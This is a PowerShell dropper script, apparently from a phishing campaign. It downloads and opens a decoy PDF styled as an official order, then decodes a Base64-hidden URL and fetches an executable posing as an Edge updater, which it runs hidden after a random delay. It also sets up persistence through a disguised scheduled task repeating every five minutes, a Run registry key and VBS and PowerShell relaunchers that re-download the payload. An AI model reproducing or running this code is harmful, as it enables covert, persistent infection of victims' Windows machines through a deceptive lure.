$ErrorActionPreference = 'Continue'

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) {
    New-Item -ItemType Directory -Path $cache -Force | Out-Null
}

function log($msg) { 
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
}

log "Launcher started - cache folder ready"

Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

log "Downloading PDF..."
for ($i = 0; $i -lt 5; $i++) {
    try {
        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 15
        if ((Test-Path $pdfPath) -and ((Get-Item $pdfPath).Length -gt 10000)) {
            log "PDF downloaded successfully"
            break
        }
    } catch { log "PDF DL attempt $i failed: $_" }
    Start-Sleep -Seconds 2
}

log "Opening PDF with aggressive fallbacks..."
if (Test-Path $pdfPath) {
    for ($i = 0; $i -lt 6; $i++) {
        try {
            Start-Process $pdfPath -Verb Open -ErrorAction Stop
            log "PDF opened with Start-Process -Verb Open"
            break
        } catch {
            try {
                & rundll32.exe url.dll,FileProtocolHandler $pdfPath
                log "PDF opened with rundll32 fallback"
                break
            } catch {}
        }
        Start-Sleep -Seconds 1
    }
} else {
    log "PDF download failed completely - skipping open"
}

log "Downloading EXE..."
for ($i = 0; $i -lt 3; $i++) {
    try {
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing -TimeoutSec 15
        if (Test-Path $exePath) { 
            log "EXE downloaded successfully"
            break 
        }
    } catch { log "EXE DL attempt $i failed" }
    Start-Sleep -Seconds 2
}

log "Waiting before launch..."
Start-Sleep -Seconds (Get-Random -Min 20 -Max 40)

log "Launching EXE via WScript..."
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
    log "EXE launched via WScript"
} catch {
    Start-Process $exePath -WindowStyle Hidden
    log "EXE launched via fallback"
}

# === PERSISTENCE ===
log "Setting up persistence..."
$randFolder = [System.IO.Path]::GetRandomFileName()
$persistDir = "$env:TEMP\$randFolder"
New-Item -ItemType Directory -Path $persistDir -Force | Out-Null

$vbsPath = "$persistDir\update.vbs"
$syncPath = "$persistDir\sync.ps1"
$taskName = "WindowsUpdateCache-$(Get-Random -Min 100000 -Max 999999)"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
`$exeUrl = "$exeUrl"
`$exePath = "`$cache\helper.exe"
if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100000)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch { Start-Process `$exePath -WindowStyle Hidden }
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(20) -RepetitionInterval (New-TimeSpan -Minutes 5)
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $taskName -Value "wscript.exe `"$vbsPath`"" -Type String -Force

log "Persistence registered - Task: $taskName"
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden

log "Launcher finished"
Start-Sleep -Seconds 5
